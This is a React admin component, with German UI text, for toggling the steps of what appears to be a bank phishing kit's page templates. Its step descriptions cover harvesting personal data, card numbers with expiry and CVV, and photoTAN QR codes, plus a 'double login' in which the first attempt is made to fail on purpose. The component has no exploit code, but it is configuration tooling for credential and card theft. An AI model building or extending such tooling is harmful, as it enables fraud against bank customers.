import React, { useState, useEffect } from 'react';
import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query';
import { templateAPI } from '../utils/api';
import { Switch } from '@headlessui/react';
import { RefreshCw, RotateCcw, Save, X } from 'lucide-react';

interface StepConfigEditorProps {
  templateId: number;
  templateName: string;
  isOpen: boolean;
  onClose: () => void;
}

interface StepConfig {
  [key: string]: boolean;
}

const stepDescriptions: Record<string, string> = {
  personalData: 'Persönliche Daten - Sammelt Name, Adresse, Telefon, E-Mail',
  bankCard: 'Bankkarten-Daten - Sammelt Kartennummer, Ablauf, CVV',
  qrCode: 'QR-Code Upload - Ermöglicht QR-Code Upload für photoTAN',
  branchSelection: 'Filialauswahl - Zeigt Filialsuche und -auswahl',
  doubleLogin: 'Doppel-Login - Erste Anmeldung schlägt fehl, zweite ist erfolgreich',
  twoStepLogin: 'Zwei-Schritt Login - Implementiert erweiterte Anmeldung',
  transactionCancel: 'Transaktions-Stornierung - Simuliert Transaktions-Abbruch',
  multiFieldLogin: 'Multi-Feld Login - Erweiterte Login-Felder',
  darkTheme: 'Dunkles Theme - Aktiviert dunkles Design'
};

export const StepConfigEditor: React.FC<StepConfigEditorProps> = ({
  templateId,
  templateName,
  isOpen,
  onClose
}) => {
  const queryClient = useQueryClient();
  const [localConfig, setLocalConfig] = useState<StepConfig>({});
  const [hasChanges, setHasChanges] = useState(false);

  // Fetch step configuration
  const { data: stepConfigData, isLoading, error } = useQuery({
    queryKey: ['step-config', templateId],
    queryFn: () => templateAPI.getStepConfig(templateId),
    enabled: isOpen && templateId > 0
  });

  // Update local config when data loads
  useEffect(() => {
    if (stepConfigData?.stepConfig) {
      setLocalConfig(stepConfigData.stepConfig);
      setHasChanges(false);
    }
  }, [stepConfigData]);

  // Bulk update mutation
  const bulkUpdateMutation = useMutation({
    mutationFn: (stepConfig: StepConfig) => 
      templateAPI.bulkUpdateStepConfig(templateId, stepConfig),
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['step-config', templateId] });
      queryClient.invalidateQueries({ queryKey: ['templates-with-stats'] });
      setHasChanges(false);
    }
  });

  // Reset to defaults mutation
  const resetMutation = useMutation({
    mutationFn: () => templateAPI.resetStepConfig(templateId),
    onSuccess: (data) => {
      setLocalConfig(data.stepConfig);
      setHasChanges(false);
      queryClient.invalidateQueries({ queryKey: ['step-config', templateId] });
      queryClient.invalidateQueries({ queryKey: ['templates-with-stats'] });
    }
  });

  const handleStepToggle = (stepName: string, enabled: boolean) => {
    const newConfig = { ...localConfig, [stepName]: enabled };
    setLocalConfig(newConfig);
    setHasChanges(true);
  };

  const handleSave = () => {
    bulkUpdateMutation.mutate(localConfig);
  };

  const handleReset = () => {
    if (confirm('Möchten Sie die Schritt-Konfiguration auf die Standardwerte zurücksetzen?')) {
      resetMutation.mutate();
    }
  };

  const handleCancel = () => {
    if (hasChanges) {
      if (confirm('Sie haben ungespeicherte Änderungen. Möchten Sie wirklich abbrechen?')) {
        setLocalConfig(stepConfigData?.stepConfig || {});
        setHasChanges(false);
        onClose();
      }
    } else {
      onClose();
    }
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
      <div className="bg-white rounded-lg p-6 w-full max-w-2xl max-h-[90vh] overflow-y-auto">
        <div className="flex items-center justify-between mb-6">
          <div>
            <h3 className="text-lg font-medium text-gray-900">
              Schritt-Konfiguration
            </h3>
            <p className="text-sm text-gray-600">
              {templateName} - Aktivieren/Deaktivieren Sie Schritte im Template-Flow
            </p>
          </div>
          <button
            onClick={handleCancel}
            className="text-gray-400 hover:text-gray-600"
          >
            <X className="h-6 w-6" />
          </button>
        </div>

        {isLoading && (
          <div className="flex items-center justify-center py-8">
            <RefreshCw className="h-6 w-6 animate-spin text-gray-400" />
            <span className="ml-2 text-gray-600">Lade Konfiguration...</span>
          </div>
        )}

        {error && (
          <div className="bg-red-50 border border-red-200 rounded-md p-4 mb-6">
            <p className="text-red-800 text-sm">
              Fehler beim Laden der Schritt-Konfiguration
            </p>
          </div>
        )}

        {stepConfigData && (
          <div className="space-y-4">
            <div className="bg-blue-50 border border-blue-200 rounded-md p-4 mb-6">
              <p className="text-blue-800 text-sm">
                <strong>Hinweis:</strong> Deaktivierte Schritte werden im Template-Flow übersprungen. 
                Stellen Sie sicher, dass mindestens ein Schritt aktiviert bleibt.
              </p>
            </div>

            {Object.entries(localConfig).map(([stepName, isEnabled]) => (
              <div
                key={stepName}
                className="flex items-center justify-between p-4 border border-gray-200 rounded-lg hover:bg-gray-50"
              >
                <div className="flex-1">
                  <div className="flex items-center">
                    <h4 className="text-sm font-medium text-gray-900 capitalize">
                      {stepName.replace(/([A-Z])/g, ' $1').trim()}
                    </h4>
                    <span className={`ml-2 px-2 py-1 text-xs rounded-full ${
                      isEnabled 
                        ? 'bg-green-100 text-green-800' 
                        : 'bg-gray-100 text-gray-600'
                    }`}>
                      {isEnabled ? 'Aktiv' : 'Inaktiv'}
                    </span>
                  </div>
                  <p className="text-sm text-gray-600 mt-1">
                    {stepDescriptions[stepName] || 'Schritt-Beschreibung nicht verfügbar'}
                  </p>
                </div>
                <Switch
                  checked={isEnabled}
                  onChange={(enabled) => handleStepToggle(stepName, enabled)}
                  className={`${
                    isEnabled ? 'bg-red-600' : 'bg-gray-200'
                  } relative inline-flex h-6 w-11 flex-shrink-0 cursor-pointer rounded-full border-2 border-transparent transition-colors duration-200 ease-in-out focus:outline-none focus:ring-2 focus:ring-red-500 focus:ring-offset-2`}
                >
                  <span
                    className={`${
                      isEnabled ? 'translate-x-5' : 'translate-x-0'
                    } pointer-events-none inline-block h-5 w-5 transform rounded-full bg-white shadow ring-0 transition duration-200 ease-in-out`}
                  />
                </Switch>
              </div>
            ))}

            {Object.keys(localConfig).length === 0 && (
              <div className="text-center py-8 text-gray-500">
                <p>Keine Schritt-Konfiguration verfügbar für dieses Template.</p>
              </div>
            )}
          </div>
        )}

        <div className="mt-8 flex justify-between">
          <button
            onClick={handleReset}
            disabled={resetMutation.isPending}
            className="inline-flex items-center px-4 py-2 border border-gray-300 shadow-sm text-sm font-medium rounded-md text-gray-700 bg-white hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-red-500 disabled:opacity-50"
          >
            {resetMutation.isPending ? (
              <RefreshCw className="h-4 w-4 mr-2 animate-spin" />
            ) : (
              <RotateCcw className="h-4 w-4 mr-2" />
            )}
            Zurücksetzen
          </button>

          <div className="flex space-x-3">
            <button
              onClick={handleCancel}
              className="px-4 py-2 border border-gray-300 shadow-sm text-sm font-medium rounded-md text-gray-700 bg-white hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-red-500"
            >
              Abbrechen
            </button>
            <button
              onClick={handleSave}
              disabled={!hasChanges || bulkUpdateMutation.isPending}
              className="inline-flex items-center px-4 py-2 border border-transparent shadow-sm text-sm font-medium rounded-md text-white bg-red-600 hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-red-500 disabled:opacity-50"
            >
              {bulkUpdateMutation.isPending ? (
                <RefreshCw className="h-4 w-4 mr-2 animate-spin" />
              ) : (
                <Save className="h-4 w-4 mr-2" />
              )}
              Speichern
            </button>
          </div>
        </div>

        {(bulkUpdateMutation.error || resetMutation.error) && (
          <div className="mt-4 bg-red-50 border border-red-200 rounded-md p-4">
            <p className="text-red-800 text-sm">
              Fehler beim Speichern der Konfiguration. Bitte versuchen Sie es erneut.
            </p>
          </div>
        )}

        {bulkUpdateMutation.isSuccess && (
          <div className="mt-4 bg-green-50 border border-green-200 rounded-md p-4">
            <p className="text-green-800 text-sm">
              Schritt-Konfiguration erfolgreich gespeichert!
            </p>
          </div>
        )}
      </div>
    </div>
  );
};
